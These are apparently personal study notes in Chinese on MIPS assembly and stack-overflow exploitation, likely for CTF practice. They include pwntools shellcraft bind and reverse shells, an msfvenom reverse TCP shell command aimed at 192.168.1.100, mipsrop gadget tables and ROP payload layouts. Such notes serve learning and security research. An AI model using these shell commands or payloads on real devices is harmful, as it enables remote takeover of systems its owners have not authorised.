---
title: MIPS
updated: 2022-08-17T16:10:54.0000000+08:00
created: 2022-04-15T21:30:07.0000000+08:00
---

# 汇编
## 寄存器\| \$ra返回地址 \$sp栈 \$fp栈帧 \$v0-\$v1返回值 \$a0-\$a3参数 \$gp全局
## 操作数\| 地址（4倍数），由大到小：dwhb，寻址：offset(\$reg)
## 指令
[MIPS指令集：运算指令、访存指令、分支和跳转、协处理器0指令_无色云的博客-CSDN博客_mips指令集](https://blog.csdn.net/weixin_38669561/article/details/104445763)
### store进mem & load出mem & dla
### mov des_reg,src_reg & li reg, val
### 计算 ADDIU rt, rs, immediate ; rt=rs+sign_extend(imme)
### 跳转 jal跳转并保存返回地址到\$ra ，bal同jal但是是相对地址
## mips没有nx
## 栈帧
# shellcode
## pwntools binutils
[Gallopsled/pwntools-binutils: Building binutils for pwntools (github.com)](https://github.com/Gallopsled/pwntools-binutils/)

安装需要的binutils即可

sudo apt-get install binutils-mipsel-linux-gnu binutils-mips-linux-gnu binutils-arm-linux-gnueabi

apt search binutils \| grep arm

查看可用shellcode

from pwn import \*

import readline,rlcompleter;readline.parse_and_bind("tab: complete")

shellcraft.mips.linux.

（按tab）

一般用法：asm(shellcraft.sh())

正向监听本地端口和反向连接目标端口：

shellcraft.mips.linux.bindsh(9999)shellcraft.mips.linux.connect('192.168.1.100',9999)+shellcraft.mips.linux.dupsh()

*来自 \<<https://xuanxuanblingbling.github.io/ctf/pwn/2020/09/24/mips/>\>*
## msfvenom
msfvenom -p linux/mipsle/shell_reverse_tcp LHOST=192.168.1.100 LPORT=8888 --arch mipsle --platform linux -f py -o shellcode.py
## 编写

# rop
## mipsrop
[解决IDA 无法安装mipsrop插件 - 简书 (jianshu.com)](https://www.jianshu.com/p/0f5923fac8d4)

[ida/plugins at master · tacnetsol/ida (github.com)](https://github.com/tacnetsol/ida/tree/master/plugins)

mipsrop.help()
## 泄露栈帧里的fp，在栈上布置shellcode并跳转
通过栈帧可以看出，fp被保存在栈中，这个fp是父函数的fp，因为mips中fp=sp，

所以如果能泄露这个fp，即可构造这样的栈溢出

padding ... fake_fp fake_ra=fp ^ shellcode

fp

.text:00400A2C 03 C0 E8 25 move \$sp, \$fp

.text:00400A30 8F BF 00 7C lw \$ra, 0x58+var_s24(\$sp)

.text:00400A34 8F BE 00 78 lw \$fp, 0x58+var_s20(\$sp)

.text:00400A38 8F B7 00 74 lw \$s7, 0x58+var_s1C(\$sp)

.text:00400A3C 8F B6 00 70 lw \$s6, 0x58+var_s18(\$sp)

.text:00400A40 8F B5 00 6C lw \$s5, 0x58+var_s14(\$sp)

.text:00400A44 8F B4 00 68 lw \$s4, 0x58+var_s10(\$sp)

.text:00400A48 8F B3 00 64 lw \$s3, 0x58+var_sC(\$sp)

.text:00400A4C 8F B2 00 60 lw \$s2, 0x58+var_s8(\$sp)

.text:00400A50 8F B1 00 5C lw \$s1, 0x58+var_s4(\$sp)

.text:00400A54 8F B0 00 58 lw \$s0, 0x58+var_s0(\$sp)

.text:00400A58 27 BD 00 80 addiu \$sp, 0x80

.text:00400A5C 03 E0 00 08 jr \$ra

.text:00400A60 00 00 00 00 nop

## jmp sp，在栈上布置shellcode并跳转
如果没法泄露fp，就没法跳转到栈上了，

而且离开的时候会把栈中的数据加载回内存，丢失掉原来的值，怎么办呢？

仔细一看，原来在离开的时候，不会改变sp的值，

只要我们把ra劫持到jmp sp 之类的地方，就依然可以跳转到栈上的shellcode

.text:00400A2C 03 C0 E8 25 move \$sp, \$fp

.text:00400A30 8F BF 00 7C lw \$ra, 0x58+var_s24(\$sp)

.text:00400A34 8F BE 00 78 lw \$fp, 0x58+var_s20(\$sp)

.text:00400A38 8F B7 00 74 lw \$s7, 0x58+var_s1C(\$sp)

.text:00400A3C 8F B6 00 70 lw \$s6, 0x58+var_s18(\$sp)

.text:00400A40 8F B5 00 6C lw \$s5, 0x58+var_s14(\$sp)

.text:00400A44 8F B4 00 68 lw \$s4, 0x58+var_s10(\$sp)

.text:00400A48 8F B3 00 64 lw \$s3, 0x58+var_sC(\$sp)

.text:00400A4C 8F B2 00 60 lw \$s2, 0x58+var_s8(\$sp)

.text:00400A50 8F B1 00 5C lw \$s1, 0x58+var_s4(\$sp)

.text:00400A54 8F B0 00 58 lw \$s0, 0x58+var_s0(\$sp)

.text:00400A58 27 BD 00 80 addiu \$sp, 0x80

.text:00400A5C 03 E0 00 08 jr \$ra

.text:00400A60 00 00 00 00 nop

### 先把sp保存到其他寄存器
首先使用mipsrop来寻找将栈地址放到其他寄存器的gadget

mipsrop.stackfinder()
| **Address** | **Action**           | **Control Jump** |
|-------------|----------------------|------------------|
| 0x004273C4  | addiu \$a2,\$sp,0x64 | jalr \$s0        |
| 0x0042BCD0  | addiu \$a2,\$sp,0x7C | jalr \$s2        |
| 0x0042FA00  | addiu \$v1,\$sp,0x34 | jalr \$s1        |
| 0x004491F8  | addiu \$a2,\$sp,0x38 | jalr \$s1        |
| 0x0044931C  | addiu \$v0,\$sp,0x28 | jalr \$s1        |
| 0x00449444  | addiu \$a2,\$sp,0x38 | jalr \$s1        |
| 0x0044AD58  | addiu \$a1,\$sp,0x38 | jalr \$s4        |
| 0x0044AEFC  | addiu \$a1,\$sp,0x3C | jalr \$s5        |
| 0x0044B154  | addiu \$a1,\$sp,0x34 | jalr \$s2        |
| 0x0044B1EC  | addiu \$v0,\$sp,0x2C | jalr \$s2        |
| 0x0044B3EC  | addiu \$v0,\$sp,0x40 | jalr \$s0        |
| 0x00454E94  | addiu \$s7,\$sp,0x20 | jalr \$s3        |
| 0x00465BEC  | addiu \$a1,\$sp,0x2C | jalr \$s0        |

### 再跳转到其他寄存器
以第一个为例，我们要：
1.  找跳转到a2的gadget
一般间接跳转用\$t9，找给\$t9赋值的gadget

mipsrop.find("move \$t9,\$a2")
| **Address** | **Action**     | **Control Jump** |
|-------------|----------------|------------------|
| 0x00421684  | move \$t9,\$a2 | jr \$a2          |
2.  把1.中找到的gadget保存到s0中
3.  在sp+0x64处布置shellcode
### 最终payload
... fake_s0=jr_a2 ... fake_ra=addiu_a2_sp64_jalr_s0 ^ ....(0x64)... shellcode

sp

# 待整理
栈溢出
确定溢出长度 pwntools的cyclic

（空字节绕过，动态库基址不变）

找gadget

找shellcode

ret2libc reTCP等待回连

（动态库基址改变）

溢出漏洞
MIPS堆栈原理

MIPS32架构堆栈（ ESP只移动一次 \| 前四个参数通过a0\~a3传输，多出的放在栈顶的参数空间 \| call的返回地址放在RA寄存器中）

函数调用的栈布局（函数参数超出4个，栈顶会预留前四个参数的空间\|call的返回地址，如果还有函数要调用，才会把地址保存到栈中\|结构 【返回地址、寄存器备份、局部变量、参数】）

利用缓冲区溢出的可行性（覆盖保存到栈上的返回地址，非叶子函数的）

漏洞攻击组成部分（跳转指令 + NOP \| ROP链 \| shellcode）

例子

源代码

确定偏移

大型字符脚本

栈帧分析

确定用rop还是shellcode

ROP链

攻击python代码

运行

基于MIPS的shellcode开发
MIPS Linux 系统调用 （int 0x80 syscall

系统调用号查询 /usr/include/mips-linux-gnu/asm/unistd.h

write 例子

编写汇编

编译

提取机器码

execve 例子

execve用法

编写汇编

shellcode编码优化

无NULL字节

shellcode编码

编码原理 （Base64 \| alpha_upper 编码后都是可见字节\| xor）

实现xor

找到合适的key

编码

解码指令头

测试

通用shellcode开发

reboot shellcode

reverse_tcp_shellcode

reverse_tcp原理

应用 上一章的例子 实现reverse tcp（略

返回到shellcode（ 地址变化怎么重定位？

